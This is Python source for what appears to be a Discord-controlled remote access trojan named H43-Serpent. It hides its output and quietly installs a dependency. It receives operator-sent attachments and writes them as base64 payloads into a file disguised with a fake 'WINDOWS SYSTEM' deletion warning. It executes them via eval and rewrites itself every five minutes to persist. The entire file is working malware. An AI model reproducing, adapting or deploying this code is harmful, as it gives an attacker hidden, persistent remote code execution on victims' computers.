TARGET = ''
TOKEN = ''
LIB = ''


'''
Author: Fytex
REPO: https://github.com/Fytex/H43-Serpent
'''


import sys, os

os.chdir(os.path.dirname(os.path.realpath(__file__)))

sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

import pip
pip.main(['install', '--upgrade', 'discord'])

import time
import asyncio
import discord
import importlib

from discord.ext import tasks
from discord.ext import commands


with open(__file__, 'r') as f:
    BACKUP_FILE = f.read()
with open(LIB + '.pyw', 'r') as f:
    LIB_BACKUP_FILE = f.read()


file_base64_content = '''\'\'\'
WINDOWS SYSTEM

[Warning]
Deleting this system\'s file can make your computer malfunction.
Action is irreversible.
\'\'\'


import base64
eval(compile(base64.b64decode({}),\'<string>\',\'exec\'))
'''



intents = discord.Intents.default()
intents.message_content = True



bot = commands.Bot(command_prefix=f'{TARGET}-', intents=intents)


@bot.event
async def on_ready():
    try:
        await bot.load_extension(LIB)
    except Exception:
        pass
    
    await auto_save.start()


@bot.command()
async def update(ctx):
    if ctx.message.attachments:
        with open(LIB + '.pyw', 'w') as f:
            text_bytes = await ctx.message.attachments[0].read()
            encoded = encoded = base64.b64encode(text_bytes)
            f.write(file_base64_content.format(encoded))

        with open(LIB + '.pyw', 'r') as f:
            LIB_BACKUP_FILE = f.read()

        # Not using reload because extension could have not been loaded
        try:
            await bot.unload_extension(LIB)
        except Exception:
            pass

        try:
            await bot.load_extension(LIB)
        except Exception:
            pass



def _auto_save():
    with open(__file__, 'w') as f:
        f.write(BACKUP_FILE)
    with open(LIB + '.pyw', 'w') as f:
        f.write(LIB_BACKUP_FILE)


@tasks.loop(seconds=300)
async def auto_save():
    _auto_save()


    
loop = asyncio.get_event_loop()

while True:
    try:
        loop.run_until_complete(bot.start(TOKEN))
    except Exception:
        time.sleep(300)
        _auto_save()
